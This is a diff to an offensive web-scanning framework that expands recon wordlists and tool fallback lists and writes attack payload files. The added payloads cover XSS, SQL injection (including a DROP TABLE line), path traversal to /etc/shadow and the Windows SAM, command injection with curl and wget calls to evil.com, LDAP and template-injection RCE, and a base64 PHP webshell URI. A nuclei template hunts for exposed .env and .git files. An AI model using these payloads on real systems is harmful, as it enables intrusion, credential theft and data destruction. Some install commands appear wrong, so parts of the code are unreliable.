@@ -1202,7 +1202,7 @@ class EnhancedPayloadManager:
     def create_enhanced_wordlists():
         """Create enhanced wordlists for various discovery purposes"""
         
-        # Common directories
+        # Common directories (expanded)
         common_dirs = [
             "admin", "administrator", "api", "app", "application", "apps", "auth",
             "backup", "backups", "bin", "blog", "cache", "cgi-bin", "cms", "config",
@@ -1213,44 +1213,97 @@ class EnhancedPayloadManager:
             "news", "old", "panel", "private", "public", "root", "scripts", "search",
             "secure", "security", "shop", "src", "static", "stats", "system", "temp",
             "test", "testing", "tmp", "upload", "uploads", "user", "users", "var",
-            "web", "webmail", "website", "www", "xml"
+            "web", "webmail", "website", "www", "xml", "assets", "build", "dist",
+            "node_modules", "vendor", "storage", "resources", "tools", "utils",
+            "bootstrap", "jquery", "fonts", "icons", "themes", "plugins", "modules",
+            "wp-content", "wp-admin", "wp-includes", "wordpress", "joomla", "drupal",
+            "phpmyadmin", "phpinfo", "info", "server-info", "server-status", "status",
+            "health", "metrics", "debug", "trace", "error", "errors", "exception",
+            "trace", "phpunit", "test-suite", "tests", "testing", "qa", "stage", "staging"
         ]
         
-        # API endpoints
+        # Extended API endpoints
         api_paths = [
-            "api/v1", "api/v2", "api/v3", "rest", "restapi", "graphql", "soap",
-            "api/users", "api/login", "api/auth", "api/token", "api/admin",
-            "api/config", "api/status", "api/health", "api/docs", "api/swagger",
-            "v1/users", "v1/auth", "v1/admin", "v2/users", "v2/auth"
+            "api/v1", "api/v2", "api/v3", "api/v4", "rest", "restapi", "graphql", "soap",
+            "api/users", "api/login", "api/auth", "api/token", "api/admin", "api/config",
+            "api/status", "api/health", "api/docs", "api/swagger", "api/openapi",
+            "v1/users", "v1/auth", "v1/admin", "v2/users", "v2/auth", "v3/users",
+            "api/internal", "api/public", "api/private", "api/external", "api/webhook",
+            "webhook", "webhooks", "callback", "callbacks", "notify", "notifications",
+            "oauth", "oauth2", "saml", "sso", "ldap", "ad", "connect", "integration",
+            "sync", "import", "export", "bulk", "batch", "queue", "jobs", "tasks",
+            "search", "filter", "query", "analytics", "reports", "dashboard-api",
+            "mobile-api", "app-api", "internal-api", "service-api", "micro-service"
         ]
         
-        # Parameter names
+        # Extended parameter names
         common_params = [
             "id", "user", "username", "password", "email", "token", "key", "api_key",
             "access_token", "auth", "session", "sid", "csrf", "nonce", "callback",
             "redirect", "url", "path", "file", "filename", "page", "cmd", "command",
             "exec", "system", "shell", "query", "search", "filter", "sort", "order",
-            "limit", "offset", "count", "format", "type", "method", "action", "debug"
+            "limit", "offset", "count", "format", "type", "method", "action", "debug",
+            "lang", "locale", "theme", "skin", "template", "layout", "view", "mode",
+            "admin", "role", "permission", "scope", "level", "access", "privilege",
+            "secret", "private", "public", "hidden", "internal", "external", "data",
+            "payload", "content", "body", "message", "text", "value", "input", "output",
+            "source", "target", "destination", "origin", "referer", "referrer", "host",
+            "domain", "subdomain", "port", "protocol", "scheme", "endpoint", "service",
+            "module", "component", "widget", "plugin", "extension", "addon", "feature"
         ]
         
-        # Subdomain prefixes
+        # Extended subdomain prefixes
         subdomain_prefixes = [
             "www", "mail", "ftp", "admin", "api", "dev", "test", "staging", "prod",
             "blog", "shop", "store", "app", "mobile", "m", "secure", "vpn", "remote",
             "support", "help", "docs", "wiki", "portal", "dashboard", "panel", "cpanel",
-            "webmail", "email", "smtp", "pop", "imap", "ns1", "ns2", "dns", "cdn"
+            "webmail", "email", "smtp", "pop", "imap", "ns1", "ns2", "dns", "cdn",
+            "assets", "static", "media", "images", "img", "files", "uploads", "download",
+            "git", "svn", "repo", "code", "source", "build", "ci", "jenkins", "gitlab",
+            "github", "bitbucket", "jira", "confluence", "slack", "teams", "chat",
+            "forum", "community", "social", "network", "connect", "share", "link",
+            "go", "short", "tiny", "bit", "link", "redirect", "proxy", "gateway",
+            "load", "balance", "cluster", "node", "worker", "master", "slave", "db",
+            "database", "sql", "mongo", "redis", "elastic", "search", "solr", "ldap",
+            "directory", "auth", "sso", "oauth", "saml", "identity", "iam", "rbac",
+            "monitoring", "metrics", "logs", "trace", "debug", "error", "exception"
         ]
         
-        # Create wordlist files
-        wordlist_sets = {
-            "directories/dirs_common.txt": common_dirs + api_paths,
-            "parameters/params_common.txt": common_params,
-            "subdomains/subdomains_common.txt": subdomain_prefixes
+        # Technology-specific wordlists
+        tech_specific = {
+            "php": ["index.php", "config.php", "admin.php", "login.php", "upload.php", 
+                   "info.php", "phpinfo.php", "test.php", "backup.php", "database.php"],
+            "asp": ["default.asp", "index.asp", "admin.asp", "login.asp", "config.asp",
+                   "global.asa", "web.config", "default.aspx", "admin.aspx"],
+            "jsp": ["index.jsp", "admin.jsp", "login.jsp", "config.jsp", "web.xml",
+                   "WEB-INF/web.xml", "META-INF/context.xml"],
+            "rails": ["config/routes.rb", "config/database.yml", "Gemfile", "Rakefile"],
+            "node": ["package.json", "app.js", "server.js", "index.js", "config.json"],
+            "python": ["app.py", "main.py", "settings.py", "config.py", "requirements.txt"],
+            "git": [".git/config", ".git/HEAD", ".git/logs/HEAD", ".gitignore"],
+            "env": [".env", ".env.local", ".env.production", ".env.development", "config.json"],
+            "docker": ["Dockerfile", "docker-compose.yml", ".dockerignore", "entrypoint.sh"]
         }
         
+        # Create comprehensive wordlist files
+        wordlist_sets = {
+            "directories/dirs_common.txt": common_dirs,
+            "directories/dirs_api.txt": api_paths,
+            "directories/dirs_admin.txt": [d for d in common_dirs if any(x in d for x in ["admin", "panel", "dashboard", "manage"])],
+            "parameters/params_common.txt": common_params,
+            "parameters/params_auth.txt": [p for p in common_params if any(x in p for x in ["auth", "token", "key", "session", "login"])],
+            "subdomains/subdomains_common.txt": subdomain_prefixes,
+            "subdomains/subdomains_tech.txt": [s for s in subdomain_prefixes if any(x in s for x in ["dev", "test", "staging", "api", "admin"])],
+        }
+        
+        # Add technology-specific wordlists
+        for tech, paths in tech_specific.items():
+            wordlist_sets[f"technologies/{tech}_files.txt"] = paths
+        
+        # Create wordlist files
         for file_path, wordlist in wordlist_sets.items():
             output_file = EXTRA_DIR / file_path
-            output_file.parent.mkdir(exist_ok=True)
+            output_file.parent.mkdir(parents=True, exist_ok=True)
             
             try:
                 with open(output_file, 'w') as f:
@@ -1288,11 +1341,167 @@ class EnhancedPayloadManager:
         return None
     
     @staticmethod
+    def create_enhanced_payloads():
+        """Create comprehensive payload collections for various attack vectors"""
+        # XSS payloads
+        xss_payloads = [
+            "<script>alert('XSS')</script>",
+            "javascript:alert('XSS')",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg onload=alert('XSS')>",
+            "';alert('XSS');//",
+            "\"><script>alert('XSS')</script>",
+            "<iframe src=javascript:alert('XSS')>",
+            "<body onload=alert('XSS')>",
+            "<input onfocus=alert('XSS') autofocus>",
+            "'><svg/onload=alert('XSS')>",
+            "\"><img/src/onerror=alert('XSS')>",
+            "<svg><animatetransform onbegin=alert('XSS')>",
+            "<details open ontoggle=alert('XSS')>",
+            "<marquee onstart=alert('XSS')>",
+            "<video><source onerror=alert('XSS')>",
+            "<audio src=x onerror=alert('XSS')>",
+            "<select onfocus=alert('XSS') autofocus>",
+            "<textarea onfocus=alert('XSS') autofocus>",
+            "<keygen onfocus=alert('XSS') autofocus>",
+            "<embed src=javascript:alert('XSS')>"
+        ]
+        
+        # SQL injection payloads
+        sqli_payloads = [
+            "' OR '1'='1",
+            "' OR 1=1--",
+            "' OR 'a'='a",
+            "' OR 1=1#",
+            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+            "' UNION SELECT NULL,NULL,NULL--",
+            "' UNION ALL SELECT NULL,NULL,NULL--",
+            "'; DROP TABLE users--",
+            "' OR 1=1 LIMIT 1--",
+            "' OR 'x'='x",
+            "') OR ('1'='1",
+            "') OR (1=1)--",
+            "' OR 1=1; --",
+            "1' OR '1'='1",
+            "admin'--",
+            "admin' #",
+            "admin'/*",
+            "' OR 1=1/*",
+            "' OR 'something' like 'some%",
+            "' waitfor delay '00:00:05'--"
+        ]
+        
+        # Directory traversal payloads
+        lfi_payloads = [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+            "....//....//....//etc/passwd",
+            "..%2f..%2f..%2fetc%2fpasswd",
+            "..%252f..%252f..%252fetc%252fpasswd",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "php://filter/convert.base64-encode/resource=index.php",
+            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+            "expect://whoami",
+            "file:///etc/passwd",
+            "/var/www/html/config.php",
+            "/etc/shadow",
+            "/proc/version",
+            "/proc/self/environ",
+            "C:\\boot.ini",
+            "C:\\windows\\system32\\config\\sam",
+            "../../../../../../../../../etc/passwd",
+            "....//....//....//....//....//....//etc/passwd",
+            "/etc/passwd%00",
+            "etc/passwd%00.jpg"
+        ]
+        
+        # Command injection payloads
+        rce_payloads = [
+            "; whoami",
+            "| whoami",
+            "& whoami",
+            "&& whoami",
+            "|| whoami",
+            "`whoami`",
+            "$(whoami)",
+            "; cat /etc/passwd",
+            "; ls -la",
+            "; id",
+            "; uname -a",
+            "| cat /etc/passwd",
+            "& cat /etc/passwd",
+            "&& cat /etc/passwd",
+            "|| cat /etc/passwd",
+            "`cat /etc/passwd`",
+            "$(cat /etc/passwd)",
+            "; ping -c 4 127.0.0.1",
+            "; curl http://evil.com/",
+            "; wget http://evil.com/"
+        ]
+        
+        # LDAP injection payloads
+        ldap_payloads = [
+            "*)(uid=*))(|(uid=*",
+            "*)(|(password=*))",
+            "*))(|(cn=*",
+            "*))%00",
+            "admin)(&(password=*))",
+            "admin)(!(&(1=0)))",
+            ")|(&(objectClass=*)(uid=admin))",
+            "*)(|(objectClass=*))",
+            "admin))(|(uid=*",
+            "*)(&(objectClass=user)(uid=*))"
+        ]
+        
+        # Template payloads
+        ssti_payloads = [
+            "{{7*7}}",
+            "${7*7}",
+            "{{config}}",
+            "{{config.items()}}",
+            "{{''.__class__.__mro__[2].__subclasses__()}}",
+            "${java.lang.Runtime}",
+            "<%= 7*7 %>",
+            "${{<%[%'\"}}%\\",
+            "#{7*7}",
+            "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}",
+            "${T(java.lang.System).getenv()}",
+            "{{''.constructor.constructor('alert(1)')()}}"
+        ]
+        
+        # Create payload files
+        payload_sets = {
+            "xss/advanced_xss.txt": xss_payloads,
+            "sqli/advanced_sqli.txt": sqli_payloads,
+            "lfi/directory_traversal.txt": lfi_payloads,
+            "rce/command_injection.txt": rce_payloads,
+            "ldap/ldap_injection.txt": ldap_payloads,
+            "ssti/template_injection.txt": ssti_payloads
+        }
+        
+        for file_path, payloads in payload_sets.items():
+            output_file = PAYLOADS_DIR / file_path
+            output_file.parent.mkdir(parents=True, exist_ok=True)
+            
+            try:
+                with open(output_file, 'w') as f:
+                    for payload in payloads:
+                        f.write(f"{payload}\n")
+                logger.log(f"Created payload file: {file_path}", "SUCCESS")
+            except Exception as e:
+                logger.log(f"Failed to create payload file {file_path}: {e}", "ERROR")
+    
+    @staticmethod
     def get_payload_file(category: str, subcategory: str = "basic") -> Optional[Path]:
         """Get the best available payload file for a category"""
         payload_file = PAYLOADS_DIR / category / f"{category}_{subcategory}.txt"
         if payload_file.exists() and payload_file.stat().st_size > 0:
             return payload_file
+        
+        # Try advanced version
+        advanced_file = PAYLOADS_DIR / category / f"advanced_{category}.txt"
+        if advanced_file.exists() and advanced_file.stat().st_size > 0:
+            return advanced_file
         
         # Try any file in the category
         category_dir = PAYLOADS_DIR / category
@@ -1331,6 +1540,162 @@ class EnhancedPayloadManager:
                     wordlist_count += total_lines
         
         print(f"\n\033[96m📈 Total: {payload_count:,} payloads, {wordlist_count:,} wordlist entries\033[0m")
+
+class EnhancedNucleiManager:
+    """Enhanced nuclei template management with community sources"""
+    
+    @staticmethod
+    def update_nuclei_templates():
+        """Update nuclei templates from multiple sources"""
+        logger.log("Updating nuclei templates from multiple sources...", "INFO")
+        
+        # Core nuclei templates
+        cmd = ["nuclei", "-update-templates"]
+        result = safe_run_command(cmd, timeout=300)
+        if result and result.returncode == 0:
+            logger.log("Official nuclei templates updated successfully", "SUCCESS")
+        else:
+            logger.log("Failed to update official nuclei templates", "WARNING")
+        
+        # Additional community template sources
+        community_sources = [
+            {
+                "name": "SecLists Integration",
+                "url": "https://github.com/danielmiessler/SecLists",
+                "path": EXT_DIR / "seclists"
+            },
+            {
+                "name": "FuzzDB Integration", 
+                "url": "https://github.com/fuzzdb-project/fuzzdb",
+                "path": EXT_DIR / "fuzzdb"
+            },
+            {
+                "name": "PayloadsAllTheThings",
+                "url": "https://github.com/swisskyrepo/PayloadsAllTheThings", 
+                "path": EXT_DIR / "payloads-all-the-things"
+            }
+        ]
+        
+        for source in community_sources:
+            try:
+                if not source["path"].exists():
+                    logger.log(f"Cloning {source['name']}...", "INFO")
+                    result = safe_run_command([
+                        "git", "clone", "--depth", "1", 
+                        source["url"], str(source["path"])
+                    ], timeout=300)
+                    if result and result.returncode == 0:
+                        logger.log(f"{source['name']} cloned successfully", "SUCCESS")
+                    else:
+                        logger.log(f"Failed to clone {source['name']}", "WARNING")
+                else:
+                    logger.log(f"Updating {source['name']}...", "INFO")
+                    result = safe_run_command([
+                        "git", "pull"
+                    ], cwd=source["path"], timeout=120)
+                    if result and result.returncode == 0:
+                        logger.log(f"{source['name']} updated successfully", "SUCCESS")
+                    else:
+                        logger.log(f"Failed to update {source['name']}", "WARNING")
+            except Exception as e:
+                logger.log(f"Error with {source['name']}: {e}", "ERROR")
+    
+    @staticmethod
+    def get_nuclei_template_paths() -> List[str]:
+        """Get all available nuclei template paths"""
+        template_paths = []
+        
+        # Default nuclei templates
+        home_dir = Path.home()
+        default_templates = home_dir / "nuclei-templates"
+        if default_templates.exists():
+            template_paths.append(str(default_templates))
+        
+        # Custom template directories
+        custom_templates = HERE / "nuclei-templates"
+        if custom_templates.exists():
+            template_paths.append(str(custom_templates))
+        
+        # External template sources
+        external_templates = EXT_DIR / "nuclei-templates"
+        if external_templates.exists():
+            template_paths.append(str(external_templates))
+        
+        return template_paths
+    
+    @staticmethod
+    def create_custom_nuclei_templates():
+        """Create custom nuclei templates for enhanced detection"""
+        custom_dir = HERE / "nuclei-templates" / "custom"
+        custom_dir.mkdir(parents=True, exist_ok=True)
+        
+        # Custom template for common vulnerabilities
+        custom_template = """id: custom-common-vulns
+
+info:
+  name: Common Web Application Vulnerabilities
+  author: Bl4ckC3ll_PANTHEON
+  severity: medium
+  description: Detects common web application vulnerabilities and misconfigurations
+  tags: custom,webapp,misconfiguration
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/.env"
+      - "{{BaseURL}}/config.php.bak"
+      - "{{BaseURL}}/backup.sql"
+      - "{{BaseURL}}/phpinfo.php" 
+      - "{{BaseURL}}/server-status"
+      - "{{BaseURL}}/server-info"
+      - "{{BaseURL}}/.git/config"
+      - "{{BaseURL}}/web.config"
+      - "{{BaseURL}}/WEB-INF/web.xml"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "APP_KEY="
+          - "DB_PASSWORD="
+          - "<?php"
+          - "CREATE TABLE"
+          - "Server Information"
+          - "Apache Server Status"
+          - "[core]"
+          - "<configuration>"
+          - "<web-app"
+        
+      - type: status
+        status:
+          - 200
+"""
+        
+        try:
+            with open(custom_dir / "common-vulns.yaml", "w") as f:
+                f.write(custom_template)
+            logger.log("Created custom nuclei template: common-vulns.yaml", "SUCCESS")
+        except Exception as e:
+            logger.log(f"Failed to create custom nuclei template: {e}", "ERROR")
+    
+    @staticmethod
+    def show_nuclei_stats():
+        """Display nuclei template statistics"""
+        template_paths = EnhancedNucleiManager.get_nuclei_template_paths()
+        
+        print(f"\n\033[92m🎯 Nuclei Template Statistics:\033[0m")
+        total_templates = 0
+        
+        for path in template_paths:
+            path_obj = Path(path)
+            if path_obj.exists():
+                yaml_files = list(path_obj.rglob("*.yaml")) + list(path_obj.rglob("*.yml"))
+                count = len(yaml_files)
+                total_templates += count
+                print(f"  📂 {path_obj.name}: {count:,} templates")
+        
+        print(f"\n\033[96m🔥 Total Nuclei Templates: {total_templates:,}\033[0m")
+
 def create_resource_monitor_thread(cfg: Dict[str, Any]) -> Tuple[threading.Event, threading.Thread]:
     """Create and start a resource monitoring thread"""
     stop_event = threading.Event()
@@ -1668,74 +2033,105 @@ def which(tool: str) -> bool:
     return shutil.which(tool) is not None
 
 # ---------- Enhanced Tool Fallback System ----------
-class ToolFallbackManager:
-    """Manages fallback tools and alternatives for enhanced reliability"""
+class EnhancedToolFallbackManager:
+    """Enhanced tool management with intelligent fallbacks and auto-installation"""
     
     TOOL_ALTERNATIVES = {
-        # Subdomain Discovery
-        "subfinder": ["amass", "assetfinder", "findomain", "sublist3r"],
-        "amass": ["subfinder", "assetfinder", "findomain"],
-        "assetfinder": ["subfinder", "amass", "findomain"],
-        "findomain": ["subfinder", "amass", "assetfinder"],
+        # Subdomain Discovery (Enhanced)
+        "subfinder": ["amass", "assetfinder", "findomain", "sublist3r", "dnsrecon", "fierce"],
+        "amass": ["subfinder", "assetfinder", "findomain", "sublist3r"],
+        "assetfinder": ["subfinder", "amass", "findomain", "sublist3r"],
+        "findomain": ["subfinder", "amass", "assetfinder", "sublist3r"],
+        "sublist3r": ["subfinder", "amass", "assetfinder", "findomain"],
         
-        # Port Scanning  
-        "naabu": ["masscan", "nmap", "zmap", "rustscan"],
-        "masscan": ["nmap", "naabu", "zmap"],
-        "nmap": ["masscan", "naabu", "zmap"],
-        "rustscan": ["nmap", "masscan", "naabu"],
+        # Port Scanning (Enhanced)
+        "naabu": ["masscan", "nmap", "zmap", "rustscan", "unicornscan"],
+        "masscan": ["nmap", "naabu", "zmap", "rustscan"],
+        "nmap": ["masscan", "naabu", "zmap", "rustscan"],
+        "rustscan": ["nmap", "masscan", "naabu", "zmap"],
+        "zmap": ["masscan", "nmap", "naabu", "rustscan"],
         
-        # HTTP Probing
-        "httpx": ["httprobe", "curl", "wget"],
-        "httprobe": ["httpx", "curl"],
+        # HTTP Probing (Enhanced)
+        "httpx": ["httprobe", "curl", "wget", "meg"],
+        "httprobe": ["httpx", "curl", "wget"],
+        "meg": ["httpx", "httprobe", "curl"],
         
-        # Directory Fuzzing
-        "gobuster": ["ffuf", "dirb", "dirsearch", "feroxbuster"],
-        "ffuf": ["gobuster", "dirb", "dirsearch", "feroxbuster"], 
-        "dirb": ["gobuster", "ffuf", "dirsearch"],
-        "dirsearch": ["gobuster", "ffuf", "dirb", "feroxbuster"],
-        "feroxbuster": ["ffuf", "gobuster", "dirsearch"],
+        # Directory Fuzzing (Enhanced)
+        "gobuster": ["ffuf", "dirb", "dirsearch", "feroxbuster", "wfuzz", "dirseek"],
+        "ffuf": ["gobuster", "dirb", "dirsearch", "feroxbuster", "wfuzz"], 
+        "dirb": ["gobuster", "ffuf", "dirsearch", "feroxbuster"],
+        "dirsearch": ["gobuster", "ffuf", "dirb", "feroxbuster", "wfuzz"],
+        "feroxbuster": ["ffuf", "gobuster", "dirsearch", "wfuzz"],
+        "wfuzz": ["ffuf", "gobuster", "dirsearch", "feroxbuster"],
         
-        # Web Crawling
-        "waybackurls": ["gau", "gospider", "hakrawler"],
-        "gau": ["waybackurls", "gospider", "hakrawler"],
-        "gospider": ["waybackurls", "gau", "hakrawler"],
-        "hakrawler": ["waybackurls", "gau", "gospider"],
+        # Web Crawling (Enhanced)
+        "waybackurls": ["gau", "gospider", "hakrawler", "photon", "paramspider"],
+        "gau": ["waybackurls", "gospider", "hakrawler", "photon"],
+        "gospider": ["waybackurls", "gau", "hakrawler", "photon"],
+        "hakrawler": ["waybackurls", "gau", "gospider", "photon"],
+        "photon": ["waybackurls", "gau", "gospider", "hakrawler"],
         
-        # Vulnerability Scanning
-        "nuclei": ["nikto", "nmap", "w3af", "skipfish"],
-        "nikto": ["nuclei", "nmap", "w3af"],
-        "nmap": ["nuclei", "nikto", "masscan"],
+        # Vulnerability Scanning (Enhanced)
+        "nuclei": ["nikto", "nmap", "w3af", "skipfish", "zaproxy", "arachni"],
+        "nikto": ["nuclei", "nmap", "w3af", "skipfish"],
+        "nmap": ["nuclei", "nikto", "masscan", "w3af"],
+        "w3af": ["nuclei", "nikto", "skipfish", "zaproxy"],
+        "zaproxy": ["nuclei", "nikto", "w3af", "skipfish"],
         
-        # Web Technology Detection
-        "whatweb": ["wappalyzer", "httpx", "webanalyze"],
-        "webanalyze": ["whatweb", "wappalyzer", "httpx"],
+        # Web Technology Detection (Enhanced)
+        "whatweb": ["wappalyzer", "httpx", "webanalyze", "builtwith"],
+        "webanalyze": ["whatweb", "wappalyzer", "httpx", "builtwith"],
+        "wappalyzer": ["whatweb", "webanalyze", "httpx"],
         
-        # SQL Injection
-        "sqlmap": ["sqlninja", "jSQL", "bbqsql"],
+        # SQL Injection (Enhanced)
+        "sqlmap": ["sqlninja", "jSQL", "bbqsql", "commix", "NoSQLMap"],
+        "commix": ["sqlmap", "sqlninja", "jSQL"],
+        "sqlninja": ["sqlmap", "commix", "jSQL"],
         
-        # XSS Testing
-        "dalfox": ["xsstrike", "xsser", "xss-payload-generator"],
-        "xsstrike": ["dalfox", "xsser"],
+        # XSS Testing (Enhanced)
+        "dalfox": ["xsstrike", "xsser", "xss-payload-generator", "XSScrapy"],
+        "xsstrike": ["dalfox", "xsser", "XSScrapy"],
+        "xsser": ["dalfox", "xsstrike", "XSScrapy"],
         
-        # Parameter Discovery
-        "arjun": ["paramspider", "x8", "param-miner"],
-        "paramspider": ["arjun", "x8"],
+        # Parameter Discovery (Enhanced)
+        "arjun": ["paramspider", "x8", "param-miner", "parameth"],
+        "paramspider": ["arjun", "x8", "param-miner"],
+        "x8": ["arjun", "paramspider", "param-miner"],
+        "parameth": ["arjun", "paramspider", "x8"],
         
-        # Subdomain Takeover
-        "subjack": ["subzy", "subdomain-takeover", "can-i-take-over-xyz"],
-        "subzy": ["subjack", "subdomain-takeover"],
+        # Subdomain Takeover (Enhanced)
+        "subjack": ["subzy", "subdomain-takeover", "can-i-take-over-xyz", "subover"],
+        "subzy": ["subjack", "subdomain-takeover", "subover"],
+        "subover": ["subjack", "subzy", "subdomain-takeover"],
         
-        # DNS Tools
-        "dig": ["nslookup", "host", "drill"],
-        "nslookup": ["dig", "host"],
-        "host": ["dig", "nslookup"],
+        # DNS Tools (Enhanced)
+        "dig": ["nslookup", "host", "drill", "kdig"],
+        "nslookup": ["dig", "host", "drill"],
+        "host": ["dig", "nslookup", "drill"],
+        "drill": ["dig", "nslookup", "host"],
+        
+        # Network Analysis (Enhanced)
+        "ncat": ["nc", "netcat", "socat"],
+        "nc": ["ncat", "netcat", "socat"],
+        "netcat": ["ncat", "nc", "socat"],
+        "socat": ["ncat", "nc", "netcat"],
+        
+        # SSL/TLS Analysis
+        "sslscan": ["sslyze", "testssl", "ssl-enum-ciphers"],
+        "sslyze": ["sslscan", "testssl", "ssl-enum-ciphers"],
+        "testssl": ["sslscan", "sslyze", "ssl-enum-ciphers"],
+        
+        # Content Discovery (Enhanced)
+        "katana": ["gospider", "hakrawler", "gau", "waybackurls"],
+        "crawley": ["katana", "gospider", "hakrawler"],
     }
     
     INSTALLATION_COMMANDS = {
-        # Go tools
+        # Go tools (Enhanced)
         "subfinder": "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
         "httpx": "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest", 
         "nuclei": "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+        "katana": "go install github.com/projectdiscovery/katana/cmd/katana@latest",
         "naabu": "go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",
         "ffuf": "go install github.com/ffuf/ffuf/v2@latest",
         "amass": "go install -v github.com/owasp-amass/amass/v4/...@master",
@@ -1745,14 +2141,28 @@ class ToolFallbackManager:
         "subjack": "go install github.com/haccer/subjack@latest",
         "httprobe": "go install github.com/tomnomnom/httprobe@latest",
         "gospider": "go install github.com/jaeles-project/gospider@latest",
+        "feroxbuster": "go install github.com/epi052/feroxbuster@latest",
+        "gobuster": "go install github.com/OJ/gobuster/v3@latest",
+        "subzy": "go install github.com/LukaSikic/subzy@latest",
+        "paramspider": "go install github.com/devanshbatham/paramspider@latest",
+        "dalfox": "go install github.com/hahwul/dalfox/v2@latest",
+        "x8": "go install github.com/Sh1Yo/x8/cmd/x8@latest",
+        "rustscan": "go install github.com/RustScan/RustScan@latest",
+        "hakrawler": "go install github.com/hakluke/hakrawler@latest",
+        "meg": "go install github.com/tomnomnom/meg@latest",
         
-        # Python tools  
+        # Python tools (Enhanced)
         "dirsearch": "pip3 install dirsearch",
         "sqlmap": "pip3 install sqlmap",
         "arjun": "pip3 install arjun",
         "xsstrike": "pip3 install XSStrike",
+        "commix": "pip3 install commix",
+        "photon": "pip3 install photon-crawler",
+        "sublist3r": "pip3 install sublist3r",
+        "parameth": "pip3 install parameth",
+        "wfuzz": "pip3 install wfuzz",
         
-        # System packages
+        # System packages (Enhanced)
         "nmap": "apt-get update && apt-get install -y nmap",
         "masscan": "apt-get update && apt-get install -y masscan", 
         "gobuster": "apt-get update && apt-get install -y gobuster",
